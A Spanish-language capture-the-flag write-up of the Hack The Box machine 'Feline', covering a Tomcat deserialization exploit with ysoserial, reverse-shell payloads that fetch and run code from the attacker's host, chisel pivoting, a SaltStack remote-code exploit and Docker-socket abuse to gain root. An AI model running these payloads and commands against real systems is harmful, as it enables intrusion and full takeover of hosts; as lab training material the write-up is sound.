---
layout: post
title: Feline
date: 2023-03-13
description:
img:
fig-caption:
tags: [eWPT, eWPTXv2, eCPPTv2, eCPTXv2, OSWE]
---
___

<center><img src="/writeups/assets/img/Feline-htb/Feline.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Information Disclosure

* Apache Tomcat Deserialización

* Pivoting

* Abuso de SaltStack

* Abuso de unix socket docker file junto a la API (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn 10.10.10.205 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-13 16:47 GMT
Nmap scan report for 10.10.10.205
Host is up (0.064s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 14.10 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,8080 10.10.10.205 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-13 16:48 GMT
Nmap scan report for 10.10.10.205
Host is up (0.041s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
8080/tcp open  http    Apache Tomcat 9.0.27
|_http-title: VirusBucket
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.05 seconds
```

## Puerto 8080 (HTTP-PROXY)

Con ```whatweb``` analizo las tecnologías que está empleando el servidor web

```null
whatweb http://10.10.10.205:8080
http://10.10.10.205:8080 [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.10.10.205], Title[VirusBucket]
```

La página principal se ve así:

<img src="/writeups/assets/img/Feline-htb/1.png" alt="">

En ```/service```, hay una sección que permite subir archivos

<img src="/writeups/assets/img/Feline-htb/2.png" alt="">

Lo intercepto con ```BurpSuite```

<img src="/writeups/assets/img/Feline-htb/3.png" alt="">

Por detrás está desplegado un Tomcat. Aplico fuzzing para descubrir rutas

```null
gobuster dir -u http://10.10.10.205:8080/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.205:8080/
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/03/13 16:51:21 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 302) [Size: 0] [--> /images/]
/service              (Status: 302) [Size: 0] [--> /service/]
```

Creo un archivo JSP que se encargue de enviar una reverse shell

```null
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.9 LPORT=443 -f jsp -o test.jsp
```

Pero no me deja subirlo. Se leakea una ruta en el error

<img src="/writeups/assets/img/Feline-htb/4.png" alt="">

Al no poner nada en el nombre aparece otra ruta

<img src="/writeups/assets/img/Feline-htb/5.png" alt="">

La versión de Tomcat que se está empleando tiene asociado un CVE. En este [artículo](https://www.hackplayers.com/2021/01/cve-2020-9484-rce-tomcat.html) está detallado en que consiste. Para poder usar ```ysoserial```, tengo que forzar que la versión de java que se emplee sea java11

```null
update-alternatives --config java
```

```null
java -jar ysoserial-master.jar CommonsCollections2 'ping -c 1 10.10.16.9' > pwned.session
```

Subo el ```pwned.session``` y luego lo llamo a través de la cookie sin la extensión. Al tramitar una petición para que se deserialice la data, recibo la traza ICMP a mi equipo

```null
curl -s -X GET 'http://10.10.10.205:8080' -H "Cookie: JSESSIONID=../../../../../../opt/samples/uploads/pwned"
```

```null
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
18:13:22.743106 IP 10.10.10.205 > 10.10.16.9: ICMP echo request, id 1, seq 1, length 64
18:13:22.743173 IP 10.10.16.9 > 10.10.10.205: ICMP echo reply, id 1, seq 1, length 64
```

Para ganar acceso al sistema, creo un archivo ```index.html``` que se encargue de enviarme una reverse shell, el cual hosteo con ```python```

```null
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/10.10.16.9/443 0>&1'
```

Primero creo uno que lo almacena en una ruta del sistema

```null
java -jar ysoserial-master.jar CommonsCollections2 'curl 10.10.16.9 -o /dev/shm/shell' > shell1.session 
```

Y otro para que lo ejecute

```null
java -jar ysoserial-master.jar CommonsCollections2 'bash /dev/shm/shell' > shell2.session
```

Gano acceso al sistema

```null
 nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.10.205] 33052
bash: cannot set terminal process group (1041): Inappropriate ioctl for device
bash: no job control in this shell
tomcat@VirusBucket:/opt/tomcat$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
tomcat@VirusBucket:/opt/tomcat$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
tomcat@VirusBucket:/opt/tomcat$ export TERM=xterm
tomcat@VirusBucket:/opt/tomcat$ export SHELL=bash
tomcat@VirusBucket:/opt/tomcat$ stty rows 55 columns 209
```

Estoy dentro de la máquina víctima

```null
tomcat@VirusBucket:/opt/tomcat$ whoami
tomcat
tomcat@VirusBucket:/opt/tomcat$ hostname -I
10.10.10.205 172.18.0.1 172.17.0.1 dead:beef::250:56ff:feb9:6881 
```

Puedo ver la primera flag

```null
tomcat@VirusBucket:~$ cat user.txt 
1766a655f449e1c4c916fe0c7f683a4e
```

# Escalada

No puedo listar procesos de otros usuarios porque el ```hidepid``` está habilitado

```null
tomcat@VirusBucket:/$ mount | grep proc
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime,hidepid=2)
systemd-1 on /proc/sys/fs/binfmt_misc type autofs (rw,relatime,fd=28,pgrp=1,timeout=0,minproto=5,maxproto=5,direct,pipe_ino=15951)
```

Listo los puertos abiertos internamente

```null
tomcat@VirusBucket:/$ ss -nltp
State                Recv-Q               Send-Q                                  Local Address:Port                              Peer Address:Port               Process                                        
LISTEN               0                    4096                                        127.0.0.1:44901                                  0.0.0.0:*                                                                 
LISTEN               0                    4096                                    127.0.0.53%lo:53                                     0.0.0.0:*                                                                 
LISTEN               0                    128                                           0.0.0.0:22                                     0.0.0.0:*                                                                 
LISTEN               0                    4096                                        127.0.0.1:4505                                   0.0.0.0:*                                                                 
LISTEN               0                    4096                                        127.0.0.1:4506                                   0.0.0.0:*                                                                 
LISTEN               0                    4096                                        127.0.0.1:8000                                   0.0.0.0:*                                                                 
LISTEN               0                    1                                  [::ffff:127.0.0.1]:8005                                         *:*                   users:(("java",pid=1072,fd=56))               
LISTEN               0                    100                                                 *:8080                                         *:*                   users:(("java",pid=1072,fd=45))               
LISTEN               0                    128                                              [::]:22                                        [::]:*        
```

Subo el ```chisel``` para poder tener conectividad con estos

En mi equipo creo el servidor

```null
chisel server -p 1234 --reverse
2023/03/13 18:43:29 server: Reverse tunnelling enabled
2023/03/13 18:43:29 server: Fingerprint 2yhsgAw0I2dTnVkt2gZ6uTVfDOyEI12JAS3J9hQfB74=
2023/03/13 18:43:29 server: Listening on http://0.0.0.0:1234
2023/03/13 18:43:40 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Desde la máquina víctima me conecto

```null
tomcat@VirusBucket:/tmp$ ./chisel client 10.10.16.9:1234 R:socks &>/dev/null & disown
```

El servicio que corre para los puertos 4505 y 4506 puede que sea vulnerable si coincide la versión del exploit

```null
searchsploit saltstack
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                 |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Saltstack 3000.1 - Remote Code Execution                                                                                                                                       | multiple/remote/48421.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Me traigo el exploit y lo ejecuto

```null
proxychains python3 exploit.py --master 127.0.0.1 --exec 'curl 10.10.16.9 | bash'
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.
/usr/local/lib/python3.11/dist-packages/salt-3006.0rc1+39.g98b151afc5-py3.11.egg/salt/transport/client.py:29: DeprecationWarning: This module is deprecated. Please use salt.channel.client instead.
  warn_until(
[+] Checking salt-master (127.0.0.1:4506) status... ONLINE
[+] Checking if vulnerable to CVE-2020-11651... YES
[*] root key obtained: etV+RAjLTqVPDAvLG+++LZFuw91uemWwbZAtKybETXGaMaQsS+BjqVGLePRcF2OvLFx4ktxEvhU=
[+] Attemping to execute curl 10.10.16.9 | bash on 127.0.0.1
[+] Successfully scheduled job: 20230313210001395873
```

Recibo la reverse shell

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.9] from (UNKNOWN) [10.10.10.205] 51180
bash: cannot set terminal process group (7051): Inappropriate ioctl for device
bash: no job control in this shell
root@2d24bf61767c:~# script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
root@2d24bf61767c:~# ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
root@2d24bf61767c:~# export TERM=xterm
root@2d24bf61767c:~# export SHELL=bash
root@2d24bf61767c:~# stty rows 55 columns 209
```

Estoy dentro de otro contenedor

```null
root@2d24bf61767c:~# hostname -I
172.17.0.2 
```

Hay un archivo ```todo.txt```

```null
root@2d24bf61767c:~# cat todo.txt 
- Add saltstack support to auto-spawn sandbox dockers through events.
- Integrate changes to tomcat and make the service open to public.
```

Puedo leer el histórico de la ```bash```

```null
root@2d24bf61767c:~# cat .bash_history 
paswd
passwd
passwd
passswd
passwd
passwd
cd /root
ls
ls -la
rm .wget-hsts 
cd .ssh/
ls
cd ..
printf '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.' > todo.txt
cat todo.txt 
printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.' > todo.txt
cat todo.txt 
printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.\' > todo.txt
printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.\n' > todo.txt
printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.\' > todo.txt
printf -- '- Add saltstack support to auto-spawn sandbox dockers.\n- Integrate changes to tomcat and make the service open to public.\n' > todo.txt
cat todo.txt 
printf -- '- Add saltstack support to auto-spawn sandbox dockers through events.\n- Integrate changes to tomcat and make the service open to public.\n' > todo.txt
cd /home/tomcat
cat /etc/passwd
exit
cd /root/
ls
cat todo.txt 
ls -la /var/run/
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
exit
```

En el penúltimo comando se está montando un socket file. Este archivo es SUID y el propietario es ```root```. Está activo, por lo que me puedo conectar

```null
root@2d24bf61767c:~# curl -s --unix-socket /var/run/docker.sock http://localhost/images/json
[
  {
    "Containers": -1,
    "Created": 1590787186,
    "Id": "sha256:a24bb4013296f61e89ba57005a7b3e52274d8edd3ae2077d04395f806b63d83e",
    "Labels": null,
    "ParentId": "",
    "RepoDigests": null,
    "RepoTags": [
      "sandbox:latest"
    ],
    "SharedSize": -1,
    "Size": 5574537,
    "VirtualSize": 5574537
  },
  {
    "Containers": -1,
    "Created": 1588544489,
    "Id": "sha256:188a2704d8b01d4591334d8b5ed86892f56bfe1c68bee828edc2998fb015b9e9",
    "Labels": null,
    "ParentId": "",
    "RepoDigests": [
      "<none>@<none>"
    ],
    "RepoTags": [
      "<none>:<none>"
    ],
    "SharedSize": -1,
    "Size": 1056679100,
    "VirtualSize": 1056679100
  }
]
```

Existe una imagen llamada ```sandbox:latest```. Listo los contenedores

```null
root@2d24bf61767c:~# curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json
[
  {
    "Id": "2d24bf61767ce2a7a78e842ebc7534db8eb1ea5a5ec21bb735e472332b8f9ca2",
    "Names": [
      "/saltstack"
    ],
    "Image": "188a2704d8b0",
    "ImageID": "sha256:188a2704d8b01d4591334d8b5ed86892f56bfe1c68bee828edc2998fb015b9e9",
    "Command": "/usr/bin/dumb-init /usr/local/bin/saltinit",
    "Created": 1593520419,
    "Ports": [
      {
        "IP": "127.0.0.1",
        "PrivatePort": 4505,
        "PublicPort": 4505,
        "Type": "tcp"
      },
      {
        "IP": "127.0.0.1",
        "PrivatePort": 4506,
        "PublicPort": 4506,
        "Type": "tcp"
      },
      {
        "IP": "127.0.0.1",
        "PrivatePort": 8000,
        "PublicPort": 8000,
        "Type": "tcp"
      },
      {
        "PrivatePort": 22,
        "Type": "tcp"
      }
    ],
    "Labels": {},
    "State": "running",
    "Status": "Up 5 hours",
    "HostConfig": {
      "NetworkMode": "default"
    },
    "NetworkSettings": {
      "Networks": {
        "bridge": {
          "IPAMConfig": null,
          "Links": null,
          "Aliases": null,
          "NetworkID": "3ba45889f36747d2b8ebcc37953ccafd8786cdeb5c72c2fe9d7d55f47d8e86ee",
          "EndpointID": "58976c711fdf5a2cd16fd094199d6d13114f87b97aee4a74f4a91154cf80f693",
          "Gateway": "172.17.0.1",
          "IPAddress": "172.17.0.2",
          "IPPrefixLen": 16,
          "IPv6Gateway": "",
          "GlobalIPv6Address": "",
          "GlobalIPv6PrefixLen": 0,
          "MacAddress": "02:42:ac:11:00:02",
          "DriverOpts": null
        }
      }
    },
    "Mounts": [
      {
        "Type": "bind",
        "Source": "/var/run/docker.sock",
        "Destination": "/var/run/docker.sock",
        "Mode": "",
        "RW": true,
        "Propagation": "rprivate"
      }
    ]
  }
]
```

Como estoy como ```root```, puedo modificar este unix docker socket file abusando de la API. Más información en [HackTricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-docker-socket)


Creo un contenedor, aprovechandome de la imagen que ya existe y creando una montura que traiga toda la raíz de la máquina host

```null
root@2d24bf61767c:~# curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"sandbox:latest","HostConfig":{"Binds":["/:/pwned"]},"Cmd":["/bin/sh", "-c", "chmod u+s /pwned/bin/bash"],"Tty": true}' http://localhost/containers/create
{"Id":"8bddef351232e5f3fdb008e3092dc658c07e62700abef25424f73e219935a7fe","Warnings":[]}
```

Y lo inicio

```null
root@2d24bf61767c:~# curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/8bddef351232e5f3fdb008e3092dc658c07e62700abef25424f73e219935a7fe/start
```

La bash pasa a ser SUID en la máquina host

```null
tomcat@VirusBucket:/dev/shm$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1183448 Feb 25  2020 /bin/bash
```

Puedo ver la segunda flag

```null
tomcat@VirusBucket:/dev/shm$ bash -p
bash-5.0# cat /root/root.txt
3713eaf0cd0b8ca5c08de12e5c672f3a
```